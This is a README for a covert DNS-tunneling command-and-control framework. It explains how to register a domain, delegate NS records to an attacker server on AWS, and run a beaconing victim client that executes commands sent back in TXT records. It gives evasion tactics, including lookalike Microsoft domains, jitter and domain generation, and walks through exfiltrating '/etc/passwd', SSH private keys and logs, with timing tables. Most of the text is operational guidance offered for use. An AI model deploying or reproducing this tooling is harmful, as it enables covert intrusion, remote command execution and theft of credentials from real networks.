# DNS C2 Framework

A covert command and control framework using DNS tunneling through legitimate DNS infrastructure.

## ⚠️ Important: TRUE DNS Tunnel

This is a **proper DNS tunnel** requiring domain ownership and NS record configuration.

**How it works:**

- ❌ **Wrong**: Victim → Direct UDP to Attacker IP:53 (detectable, no stealth)
- ✅ **Correct**: Victim → DNS Resolver → Internet DNS → Attacker's NS → Response (stealthy)

**Benefits**: Blends with normal DNS traffic, bypasses firewalls, works through proxies

## Features

- **True DNS Tunneling** through DNS infrastructure (requires domain ownership)
- **TXT Record Based** - optimal for C2 (see [Why TXT Records?](#why-txt-records))
- **Maximum Stealth** - bypasses firewalls, works through corporate proxies
- **Fragmentation Protocol** - handles large outputs with MD5 checksums
- **Base32 Encoding** - DNS-safe data transmission
- **Auto-Detection** - automatically detects network interfaces and IPs
- **AWS Ready** - production deployment on EC2

## Quick Start

### Local Testing (No Domain Required)

⚠️ **Note**: Local testing bypasses DNS infrastructure and defeats the stealth purpose. Use only for development/testing.

```bash
# Terminal 1 - Attacker (binds to UDP port 53)
sudo python3 attacker/attacker_dns.py -d c2.local -a

# Terminal 2 - Victim (queries attacker directly)
sudo python3 victim/victim_dns.py -d c2.local -s <attacker-local-ip>
```

### Production Deployment (With Real Domain)

**Prerequisites:**

1. **Register domain** (e.g., `yourdomain.com`) - ~$10-15/year from Namecheap, GoDaddy, etc.
2. **Deploy attacker on public server** (AWS EC2, DigitalOcean, etc.)
3. **Configure NS record** in your domain's DNS:

   ```text
   c2.yourdomain.com IN NS <attacker-public-ip>
   ```

4. **Wait for DNS propagation** (5 minutes to 48 hours)
5. **Test NS delegation**: `dig NS c2.yourdomain.com @8.8.8.8`

```bash
# Terminal 1 - Attacker (on public server with port 53 open)
sudo python3 attacker/attacker_dns.py -d c2.yourdomain.com -a

# Terminal 2 - Victim (anywhere in the world - STEALTHY)
sudo python3 victim/victim_dns.py -d c2.yourdomain.com
```

The victim uses **Google DNS (8.8.8.8)** by default, which follows the NS delegation to your attacker server. This provides maximum stealth as traffic blends with normal DNS queries.

## Installation

```bash
# Install dependencies
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy
```

**Requirements**:

- Python 3.6+
- Root/sudo privileges (required for binding to port 53)
- No additional DNS server needed (built-in socket-based DNS server)

## Architecture

### Attacker (`attacker_dns.py`)

**Socket-based DNS server** that binds directly to UDP port 53 and acts as an authoritative nameserver:

- ✅ Binds to `0.0.0.0:53` using standard Python sockets
- ✅ Parses raw DNS packets with struct unpacking
- ✅ Creates valid DNS responses with TXT records
- ✅ Works with NS delegation from Google DNS, CloudFlare, etc.
- ✅ Case-insensitive protocol parsing (handles DNS 0x20 bit flipping)
- ✅ Production-ready for real-world deployments

### Victim (`victim_dns.py`)

**Scapy-based DNS client** that sends beacons and receives commands:

- ✅ Queries for TXT records (not A records)
- ✅ Uses Google DNS (8.8.8.8) by default for stealth
- ✅ Base32 encoding for DNS-safe data transmission
- ✅ Automatic fragmentation for large outputs
- ✅ Uses `sr1()` for proper send/receive

## Command Line Options

### Attacker

```bash
sudo python3 attacker_dns.py -d <domain> [-v <victim-ip>] [-i <interface>] [-a]

Required:
  -d, --domain DOMAIN       Base domain (e.g., c2.evil.com)

Optional:
  -v, --victim VICTIM       Specific victim IP (auto-detected if omitted)
  -i, --interface IFACE     Network interface (auto-detected)
  -a, --accept-all          Accept queries from any IP (recommended)
```

### Victim

```bash
sudo python3 victim_dns.py -d <domain> [-i <interval>] [-s <server>]

Required:
  -d, --domain DOMAIN       Base domain (e.g., c2.evil.com)

Optional:
  -i, --interval SECONDS    Beacon interval (default: 3)
  -s, --server IP           DNS server IP (uses system DNS if omitted)
```

## How It Works

### DNS Query Flow (Production)

1. **Victim creates DNS query**: `STATUS.encodeddata.c2.evil.com`
2. **Query goes to system resolver**: Victim → Local DNS (8.8.8.8, corporate DNS, etc.)
3. **Resolver follows NS records**: 8.8.8.8 sees NS record pointing to attacker IP
4. **Query forwarded to attacker**: 8.8.8.8 → Attacker (213.57.121.34)
5. **Attacker responds with TXT record**: Contains command to execute
6. **Response flows back**: Attacker → 8.8.8.8 → Victim

### Why This is Stealthy

✅ **Legitimate DNS traffic** - queries go through normal DNS infrastructure  
✅ **Works through proxies** - corporate proxies allow DNS  
✅ **Bypasses firewalls** - outbound DNS (UDP 53) rarely blocked  
✅ **Blends with noise** - lost among millions of DNS queries  
✅ **No direct connection** - victim never directly contacts attacker IP

### Protocol Details

**Query Formats:**

- `SINGLE.<base32_data>.<domain>` - Complete output in one query
- `FRAG-<id>-<n>-<total>-<checksum>.<base32_data>.<domain>` - Fragment n of total
- `STATUS.<encoded_status>.<domain>` - Status beacon
- `READY-idle.<domain>` - Ready for next command

**Response Format:**

- TXT record containing command (e.g., `whoami`, `ls -la`)
- Or `NOOP` for keep-alive

**Encoding:**

- Base32 for DNS-safe characters (alphanumeric only)
- ~60% efficient (5 bytes → 8 characters)
- Chunk size: ~125 bytes original data per query

**Fragmentation:**

- Large outputs split into fragments (~210 chars of base32 per DNS query)
- DNS label limit: 63 chars per label, multiple labels per query
- MD5 checksum for integrity verification (case-insensitive comparison)
- Handles DNS 0x20 case randomization (base32 data + checksum normalized)
- Automatic reassembly on attacker side
- Total DNS query limit: 253 characters (protocol + multi-label data + domain)
- Example: 1.3KB file = 10 fragments = 30 seconds at 3-second beacon interval
- Example: 10KB file = ~48 fragments = ~2.4 minutes at 3-second beacon interval

## Why TXT Records?

DNS C2 frameworks can use various record types, but **TXT records are optimal** for several reasons:

### 1. Data Capacity

- **TXT**: Up to 255 bytes per string, multiple strings allowed (~4KB practical limit)
- **A**: Only 4 bytes (IPv4 address)
- **AAAA**: Only 16 bytes (IPv6 address)
- **CNAME/NS**: Domain names only, not arbitrary data

For sending commands like `cat /etc/passwd` or receiving multi-kilobyte outputs, TXT records provide sufficient capacity.

### 2. Arbitrary Data Support

- **TXT**: Accepts any text string - perfect for base32/base64 encoded data
- **A/AAAA**: Must be valid IP addresses - severely limits encoding options
- **MX/NS**: Must be valid hostnames - no special characters or spaces

### 3. Legitimate Use Cases (Stealth)

TXT records are commonly used for legitimate purposes, making C2 traffic blend in:

- **SPF records**: `v=spf1 include:_spf.google.com ~all`
- **DKIM signatures**: Long base64-encoded email authentication keys
- **Domain verification**: `google-site-verification=abc123...`
- **Service configuration**: Many cloud services use TXT for config

Corporate networks are accustomed to seeing TXT queries, reducing suspicion.

### 4. Bidirectional Communication

- **Query (Victim → Attacker)**: Data encoded in subdomain (works with any type)
- **Response (Attacker → Victim)**: Data in record content
  - TXT: Can return full command strings (`whoami`, `cat /etc/passwd`)
  - A: Would need to encode commands in 4 bytes (impractical)
  - CNAME: Limited to domain-name-safe characters only

### 5. No Format Restrictions

- **A records**: Must decode to valid IP (only 4 bytes, 0-255 per octet)
- **TXT records**: Any printable characters, base32/base64 data fits perfectly
- **NULL records**: Technically could work but poorly supported and suspicious

### Comparison with Alternatives

| Record Type | Capacity   | Arbitrary Data | Legitimate Use | Widely Supported | C2 Suitability |
| ----------- | ---------- | -------------- | -------------- | ---------------- | -------------- |
| **TXT**     | ~4KB       | ✅ Yes         | ✅ Very common | ✅ Universal     | ⭐⭐⭐⭐⭐     |
| A           | 4 bytes    | ❌ IP only     | ✅ Common      | ✅ Universal     | ⭐             |
| AAAA        | 16 bytes   | ❌ IPv6 only   | ✅ Common      | ✅ Universal     | ⭐⭐           |
| CNAME       | Domain     | ❌ Names only  | ✅ Common      | ✅ Universal     | ⭐⭐           |
| NULL        | ~4KB       | ✅ Yes         | ❌ Rare        | ❌ Poor          | ⭐⭐           |
| MX          | Domain+Pri | ❌ Names only  | ✅ Common      | ✅ Universal     | ⭐             |

**Conclusion**: TXT records provide the best balance of capacity, flexibility, stealth, and compatibility for DNS C2 operations.

## AWS EC2 Deployment

### Step 1: Domain Setup (REQUIRED for Production)

**Register Domain:**

- Use Namecheap, GoDaddy, or any registrar
- Cost: ~$10-15/year
- Example: `updates-cdn.com` (use legitimate-looking names)

**Configure NS Records:**

In your domain registrar's DNS settings:

```text
c2.updates-cdn.com  IN  NS  <your-ec2-public-ip>
```

**Verify DNS Delegation:**

```bash
dig NS c2.updates-cdn.com @8.8.8.8
# Should return your attacker's IP
```

### Step 2: Security Groups

**Attacker Instance:**

- **Inbound**: UDP port 53 from `0.0.0.0/0`
- **Outbound**: UDP port 53 to `0.0.0.0/0`

**Victim Instance:**

- **Outbound**: UDP port 53 to `0.0.0.0/0`

### Step 3: Deploy

**On Attacker EC2:**

```bash
# Get public IP
curl ifconfig.me  # Example: 213.57.121.34

# Install dependencies
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy netifaces

# Run attacker
sudo python3 attacker_dns.py -d c2.updates-cdn.com -a
```

**On Victim EC2:**

```bash
# Install dependencies
sudo apt update && sudo apt install -y python3-pip
sudo pip3 install scapy

# Run victim (production - through DNS infrastructure)
sudo python3 victim_dns.py -d c2.updates-cdn.com

# OR for testing before NS propagation (direct to attacker)
sudo python3 victim_dns.py -d c2.updates-cdn.com -s 213.57.121.34
```

### Step 4: Verify

```bash
# Check NS records propagated
dig NS c2.updates-cdn.com @8.8.8.8

# Test direct DNS query
dig test.c2.updates-cdn.com @213.57.121.34

# Monitor traffic on attacker
sudo tcpdump -i any udp port 53 -n
```

## Production Considerations

### Stealth Improvements

| Technique                   | Example                            | Benefit                       |
| --------------------------- | ---------------------------------- | ----------------------------- |
| Legitimate-looking domain   | `updates-cdn.com` vs `c2.evil.com` | Blends with normal traffic    |
| Slow beacon interval        | `-i 300` (every 5 minutes)         | Reduces query volume          |
| Add jitter                  | Randomize intervals ±30 seconds    | Breaks pattern detection      |
| Domain Generation Algorithm | Rotate through multiple domains    | Blocks one, others still work |

### Real-World Example

**Scenario**: Corporate laptop behind firewall

**Setup**:

1. Register `updates-cdn-microsoft.com` ($12/year)
2. Set NS: `updates-cdn-microsoft.com` → EC2 (213.57.121.34)
3. Deploy victim: `sudo python3 victim_dns.py -d updates-cdn-microsoft.com`
4. Laptop queries `status.updates-cdn-microsoft.com`
5. Corporate DNS forwards to your NS → C2 channel established ✅

**Why it works**: DNS always allowed, looks like Microsoft CDN, no direct connection

### Security Limitations

⚠️ **Current Implementation:**

- Commands sent in plaintext TXT records
- Output encoded (base32) but not encrypted
- No authentication mechanism

**For Operational Use:**

- Implement encryption (AES, ChaCha20)
- Add HMAC authentication
- Use domain generation algorithm (DGA)

### Detection Risks

⚠️ High query volume to same domain  
⚠️ Long subdomain names (base32 encoded data)  
⚠️ Unusual TXT record responses  
⚠️ Regular beacon intervals

**Mitigation**: Add jitter, slower intervals, compress data, use multiple domains

## Comparison: With vs Without Domain

| Feature                   | With Domain     | Without Domain |
| ------------------------- | --------------- | -------------- |
| **Stealth**               | Excellent       | Poor           |
| **Firewall Bypass**       | Excellent       | Poor           |
| **Works Through Proxies** | Yes             | No             |
| **Detection Risk**        | Low             | High           |
| **Setup**                 | Moderate (~$15) | Simple (free)  |
| **Recommended For**       | Production      | Testing only   |

## Troubleshooting

### Victim Says "DNS response with no answers"

**Most Common Causes:**

1. **Victim querying for A records instead of TXT records**

   - ✅ Fixed: Victim now queries for `qtype="TXT"`
   - Verify: `dig test.c2.yourdomain.com TXT @8.8.8.8` should return TXT record

2. **Attacker not running or crashed**

   - Check: `sudo lsof -i :53` (should show Python listening)
   - Check: `ps aux | grep attacker_dns`

3. **NS delegation not working**

   - Verify: `dig NS c2.yourdomain.com @8.8.8.8`
   - Should return: `c2.yourdomain.com. IN NS <your-attacker-ip>`

4. **Firewall blocking UDP port 53**
   - Inbound: Allow UDP 53 from `0.0.0.0/0`
   - Outbound: Allow UDP 53 to `0.0.0.0/0`

### SERVFAIL Errors

**Symptom**: `dig` returns `status: SERVFAIL`

**Causes:**

1. **Attacker not listening on port 53**

   ```bash
   # Check what's listening
   sudo ss -tulpn | grep :53

   # Should see Python bound to 0.0.0.0:53
   ```

2. **systemd-resolved blocking port 53**

   ```bash
   sudo systemctl stop systemd-resolved
   sudo systemctl disable systemd-resolved
   ```

3. **Security group missing outbound rule** (AWS)
   - Add: Outbound UDP 53 to 0.0.0.0/0

### Permission Errors

Always run with `sudo` (requires binding to privileged port 53):

```bash
sudo python3 attacker/attacker_dns.py -d c2.yourdomain.com -a
sudo python3 victim/victim_dns.py -d c2.yourdomain.com
```

### Port 53 Already in Use

**If systemd-resolved is running:**

```bash
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Then restart attacker
sudo python3 attacker/attacker_dns.py -d c2.yourdomain.com -a
```

### No Output Displayed on Attacker

**Symptom**: Commands execute but output not shown

**Cause**: Case sensitivity in protocol parsing (DNS randomizes case)

**Fix**: Parser now uses `.upper()` for case-insensitive matching:

- `SINGLE` → matches `sIngle`, `SINGLE`, `single`
- `STATUS` → matches `StATUS`, `STATUS`, `status`
- `FRAG` → matches `FRAG`, `frag`, `FrAg`

### Checksum Mismatch Errors

**Symptom**: `[!] Checksum mismatch for fragment 2!` when transferring files

**Cause**: DNS 0x20 case randomization affects both base32-encoded data AND checksums

**Fix Applied**:

- Checksum comparison is now **case-insensitive** (`.lower() == .lower()`)
- Base32 decoding normalizes to uppercase automatically
- Both fixes handle Google DNS case randomization

**What happened**:

- Victim sends: `FRAG-2-1-80-b9455088.data...`
- Google DNS randomizes: `fRAg-2-1-80-B9455088.DaTa...`
- Old code: `b9455088 != B9455088` → checksum fail ❌
- New code: `b9455088.lower() == b9455088.lower()` → success ✅

**File transfer now works** for any size file with fragmentation!

### Testing NS Delegation

**Before deploying:**

```bash
# 1. Verify NS record exists
dig NS c2.yourdomain.com @8.8.8.8

# 2. Test direct query (should return TXT record)
dig test.c2.yourdomain.com TXT @8.8.8.8

# 3. Monitor attacker traffic
sudo tcpdump -i any udp port 53 -v

# 4. Check security groups (AWS)
# Inbound: UDP 53 from 0.0.0.0/0
# Outbound: UDP 53 to 0.0.0.0/0
```

## Usage Examples

### Basic Production Deployment

```bash
# Attacker (after NS records configured)
sudo python3 attacker_dns.py -d c2.evil.com -a

# Victim (uses system DNS - maximum stealth)
sudo python3 victim_dns.py -d c2.evil.com
```

### Slower Beaconing (Stealthier)

```bash
sudo python3 victim_dns.py -d c2.evil.com -i 300  # Every 5 minutes
```

### Multiple Victims

```bash
# Attacker accepts all victims
sudo python3 attacker_dns.py -d c2.evil.com -a

# Each victim beacons independently
# Victim 1: sudo python3 victim_dns.py -d c2.evil.com
# Victim 2: sudo python3 victim_dns.py -d c2.evil.com
```

### File Exfiltration

**Small text files (< 1KB):**

```bash
C&C> cat /etc/passwd
```

**Binary files or larger files (with base64):**

```bash
C&C> base64 /home/user/.ssh/id_rsa
# Wait ~4 minutes for 80 fragments
# Copy base64 output from attacker display
# Decode: echo "<output>" | base64 -d > stolen_key
```

**Compressed files (best for large files):**

```bash
C&C> gzip -c /var/log/syslog | base64
# Significantly reduces fragment count
# Decode: echo "<output>" | base64 -d | gunzip > syslog.txt
```

**File transfer timing:**

| File Size | Fragments | Time (3s interval) |
| --------- | --------- | ------------------ |
| 1 KB      | ~8-10     | ~30 seconds        |
| 10 KB     | ~80       | ~4 minutes         |
| 100 KB    | ~800      | ~40 minutes        |
| 1 MB      | ~8000     | ~7 hours           |

**Speed up transfers:**

```bash
# Victim side: faster beaconing
sudo python3 victim_dns.py -d c2.evil.com -i 1  # 1-second interval
```

## Expected Output

**Attacker Terminal:**

```text
DNS C2 Server - Beacon-based Command & Control
============================================================
[*] Listening for DNS queries from ANY victim on eth0...
[!] New victim detected: 172.31.5.23
[+] DNS Query from 172.31.5.23: STATUS.encoded.c2.evil.com
C&C> whoami
[*] Command queued. Waiting for next beacon...
[+] OUTPUT:
============================================================
ubuntu
============================================================
C&C>
```

**Victim Terminal:**

```text
[*] Victim started - beaconing to DNS infrastructure every 3s
[*] Using base domain: c2.evil.com
[*] Sending DNS beacon #1
[+] Command received: whoami
[*] Executing: whoami
```
